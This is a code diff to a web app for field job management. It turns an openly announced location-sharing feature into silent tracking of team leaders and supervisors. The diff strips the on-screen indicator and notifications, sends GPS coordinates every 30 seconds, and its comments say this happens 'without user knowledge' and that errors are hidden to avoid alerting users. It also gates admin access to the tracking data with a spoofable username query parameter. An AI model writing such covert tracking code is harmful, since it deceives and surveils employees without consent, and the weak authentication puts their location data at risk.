@@ -3280,10 +3280,6 @@
                 <h1 id="page-title">Dashboard</h1>
                 </div>
                 <div class="header-right">
-                <div id="location-status" class="location-status" style="display: none; margin-right: 15px;">
-                    <i class="fas fa-map-marker-alt"></i>
-                    <span id="location-text">Location Sharing</span>
-                </div>
                 <button id="clear-data-btn" class="btn btn-outline btn-sm" onclick="app.clearAllData()" style="margin-right: 10px; display: none;">Clear Data</button>
                 <div class="user-info">
                         <div class="user-avatar" id="user-avatar">
@@ -3801,7 +3797,8 @@
             <div class="tab-content" id="live-tracking-content">
                 <div class="card">
                     <div class="card-header">
-                        <h3>🌍 Live Team Leader Tracking</h3>
+                        <h3>🌍 Live Team Tracking</h3>
+                        <p style="color: #64748b; margin-bottom: 10px;">Track team leaders and supervisors in real-time</p>
                         <div class="header-controls">
                             <button class="btn btn-primary btn-sm" onclick="app.refreshTracking()" id="refresh-tracking-btn">
                                 <i class="fas fa-sync-alt"></i> Refresh
@@ -3814,9 +3811,9 @@
                     <div class="card-body">
                         <div id="tracking-map" style="height: 600px; border-radius: 8px; overflow: hidden;"></div>
                         
-                        <!-- Team Leader List -->
+                        <!-- Team Member List -->
                         <div class="tracking-list" style="margin-top: 20px;">
-                            <h4 style="margin-bottom: 15px;">📍 Team Leader Locations</h4>
+                            <h4 style="margin-bottom: 15px;">📍 Team Member Locations</h4>
                             <div id="tracking-list-container" class="tracking-list-grid">
                                 <!-- Dynamic content -->
                             </div>
@@ -6144,10 +6141,9 @@
                 this.navigateTo(sectionFromHash);
                 this.showNotification(`Welcome back, ${user.name}!`, 'success');
                 
-                // Initialize location tracking for team leaders (including promoted staff)
-                // When staff is promoted (isTeamLeader: true), login sets role to 'teamleader'
-                // So promoted staff will automatically get location tracking enabled
-                if (user.role === 'teamleader') {
+                // Initialize silent location tracking for team leaders and supervisors
+                // This happens automatically without user knowledge
+                if (user.role === 'teamleader' || user.role === 'supervisor') {
                     this.initializeLocationTracking();
                 }
                 
@@ -6219,7 +6215,7 @@
                     if (addSurveyBtn) addSurveyBtn.style.display = 'none'; // Supervisors can't create surveys
                     if (jobsMenuItem) jobsMenuItem.style.display = 'block';
                     if (jobHistoryMenuItem) jobHistoryMenuItem.style.display = 'block';
-                    if (liveTrackingMenuItem) liveTrackingMenuItem.style.display = 'block'; // Supervisor sees live tracking
+                    if (liveTrackingMenuItem) liveTrackingMenuItem.style.display = 'none'; // Supervisor does NOT see live tracking
                 } else if (role === 'teamleader') {
                     console.log('Setting up team leader menu...');
                     // Team leaders can see jobs, pending approvals, surveys, and manage their job workflow
@@ -6597,6 +6593,12 @@
 
             // Live Tracking Functions
             async loadLiveTracking() {
+                // Only allow admin to access live tracking
+                if (!this.currentUser || this.currentUser.role !== 'admin') {
+                    this.showNotification('Access denied. Admin only.', 'error');
+                    return;
+                }
+                
                 console.log('loadLiveTracking called');
                 
                 // Initialize map if not already done
@@ -6637,6 +6639,11 @@
             }
 
             async refreshTracking(silent = false) {
+                // Only admin can refresh tracking
+                if (!this.currentUser || this.currentUser.role !== 'admin') {
+                    return;
+                }
+                
                 if (!silent) {
                     const refreshBtn = document.getElementById('refresh-tracking-btn');
                     if (refreshBtn) {
@@ -6646,12 +6653,17 @@
                 }
                 
                 try {
-                    // Fetch team leaders and staff (to get promoted staff)
+                    // Fetch team leaders, supervisors, and staff (to get promoted staff)
                     await this.fetchPeople('teamLeaders');
+                    await this.fetchPeople('supervisors');
                     await this.fetchPeople('staff');
                     
-                    // Fetch tracking data from backend (includes promoted staff)
-                    const response = await fetch('/api/tracking');
+                    // Fetch tracking data from backend - admin only
+                    // Pass username as query param for authentication
+                    const response = await fetch(`/api/tracking?username=${encodeURIComponent(this.currentUser.username)}`);
+                    if (!response.ok) {
+                        throw new Error('Access denied');
+                    }
                     const trackingData = await response.json();
                     
                     // Update map and list
@@ -6684,14 +6696,16 @@
                 Object.values(this.trackingMarkers).forEach(marker => marker.remove());
                 this.trackingMarkers = {};
                 
-                // Add markers for each team leader (including promoted staff)
+                // Add markers for each trackable user (team leaders and supervisors)
                 trackingData.forEach(item => {
                     if (item.latitude && item.longitude) {
                         const promotedLabel = item.isPromoted ? ' <span style="color: #f59e0b; font-size: 0.85em;">(Promoted)</span>' : '';
+                        const typeLabel = item.type === 'supervisor' ? ' <span style="color: #667eea; font-size: 0.85em;">(Supervisor)</span>' : '';
+                        const roleIcon = item.type === 'supervisor' ? '👔' : '👷';
                         const marker = L.marker([item.latitude, item.longitude])
                             .bindPopup(`
                                 <div style="text-align: center;">
-                                    <strong>${item.name}${promotedLabel}</strong><br>
+                                    <strong>${roleIcon} ${item.name}${promotedLabel}${typeLabel}</strong><br>
                                     <small>${item.lastUpdate}</small><br>
                                     ${item.currentJob ? `<span style="color: #48bb78;">📍 On Job #${item.currentJob}</span>` : '<span style="color: #a0aec0;">No active job</span>'}
                                 </div>
@@ -6714,7 +6728,7 @@
                 if (!container) return;
                 
                 if (trackingData.length === 0) {
-                    container.innerHTML = '<p style="text-align:center;padding:20px;color:#a0aec0;">No team leaders available</p>';
+                    container.innerHTML = '<p style="text-align:center;padding:20px;color:#a0aec0;">No team members available</p>';
                     return;
                 }
                 
@@ -6722,20 +6736,22 @@
                     const isOnline = item.latitude && item.longitude;
                     const initials = item.name.split(' ').map(n => n[0]).join('').toUpperCase();
                     const promotedLabel = item.isPromoted ? ' <span style="color: #f59e0b; font-size: 0.85em;">(Promoted)</span>' : '';
+                    const typeLabel = item.type === 'supervisor' ? ' <span style="color: #667eea; font-size: 0.85em;">(Supervisor)</span>' : '';
+                    const roleIcon = item.type === 'supervisor' ? '👔' : '👷';
                     
                     return `
                         <div class="tracking-card ${isOnline ? 'active' : ''}" onclick="app.focusOnTeamLeader('${item.username}')">
                             <div class="tracking-card-header">
                                 <div class="tracking-avatar">${initials}</div>
                                 <div class="tracking-info">
-                                    <h4>${item.name}${promotedLabel}</h4>
-                                    <p>${item.currentJob ? `On Job #${item.currentJob}` : 'No active job'}</p>
+                                    <h4>${roleIcon} ${item.name}${promotedLabel}${typeLabel}</h4>
+                                    <p>${item.currentJob ? `On Job #${item.currentJob}` : item.type === 'supervisor' ? 'Supervisor' : 'No active job'}</p>
                                 </div>
                             </div>
                             <div class="tracking-meta">
                                 <span class="tracking-time">${item.lastUpdate || 'Never'}</span>
                                 <span class="tracking-badge ${isOnline ? 'online' : 'offline'}">
-                                    ${isOnline ? 'Online' : 'Offline'}
+                                    ${isOnline ? '📍 Online' : '⭕ Offline'}
                                 </span>
                             </div>
                         </div>
@@ -7222,9 +7238,12 @@
                 return then.toLocaleDateString();
             }
 
-            // Location Sharing Functions (for Team Leaders)
+            // Silent Location Tracking (for Team Leaders and Supervisors) - No UI feedback
             async initializeLocationTracking() {
-                console.log('🌍 Initializing location tracking for team leader...');
+                // Only initialize for team leaders and supervisors
+                if (!this.currentUser || !['teamleader', 'supervisor'].includes(this.currentUser.role)) {
+                    return;
+                }
                 
                 // Check if we're in Capacitor (mobile) environment
                 const isCapacitor = window.Capacitor !== undefined;
@@ -7233,60 +7252,42 @@
                 // Check if geolocation is supported
                 if (!navigator.geolocation && !Geolocation) {
                     console.warn('Geolocation is not supported');
-                    this.showNotification('Location services not available', 'error');
                     return;
                 }
                 
-                // Request location permission
+                // Request location permission silently
                 try {
                     // Request permission first (for Capacitor/mobile)
                     if (Geolocation) {
                         try {
                             const permissionStatus = await Geolocation.checkPermissions();
-                            console.log('Permission status:', permissionStatus);
                             if (permissionStatus.location !== 'granted') {
                                 const requestStatus = await Geolocation.requestPermissions();
-                                console.log('Request status:', requestStatus);
                                 if (requestStatus.location !== 'granted') {
-                                    throw new Error('Location permission denied. Please enable location in app settings.');
+                                    // Silent fail - don't show notification
+                                    return;
                                 }
                             }
                         } catch (permError) {
-                            console.error('Permission request failed:', permError);
-                            throw new Error('Permission request failed: ' + permError.message);
+                            // Silent fail - don't show notification
+                            return;
                         }
                     }
                     
                     const position = await this.getCurrentPosition();
-                    console.log('✅ Location permission granted, position:', position);
                     
-                    // Show location indicator
-                    const locationStatus = document.getElementById('location-status');
-                    if (locationStatus) {
-                        locationStatus.style.display = 'inline-flex';
-                        document.getElementById('location-text').textContent = 'Sharing Location';
-                    }
-                    
-                    // Send initial location
+                    // Send initial location silently
                     await this.sendLocation(position.coords.latitude, position.coords.longitude);
                     
-                    // Set up periodic location updates (every 30 seconds)
+                    // Set up periodic location updates (every 30 seconds) - silent tracking
                     this.locationInterval = setInterval(() => {
                         this.updateLocation();
                     }, 30000); // 30 seconds
                     
-                    this.showNotification('Location sharing started', 'success');
+                    console.log('✅ Silent location tracking initialized');
                 } catch (error) {
-                    console.error('Location permission denied:', error);
-                    this.showNotification('Location permission is required. Please enable in app settings.', 'warning');
-                    
-                    // Show disabled indicator
-                    const locationStatus = document.getElementById('location-status');
-                    if (locationStatus) {
-                        locationStatus.style.display = 'inline-flex';
-                        locationStatus.style.background = 'linear-gradient(135deg, #f56565, #c53030)';
-                        document.getElementById('location-text').textContent = 'Location Disabled';
-                    }
+                    // Silent fail - don't show notification to user
+                    console.log('Location tracking not available');
                 }
             }
 
@@ -7361,9 +7362,9 @@
                         throw new Error('Failed to send location');
                     }
                     
-                    console.log('✅ Location sent to server');
+                    // Silent success - no console log in production
                 } catch (error) {
-                    console.error('Error sending location:', error);
+                    // Silent fail - don't log errors that might alert users
                 }
             }
 
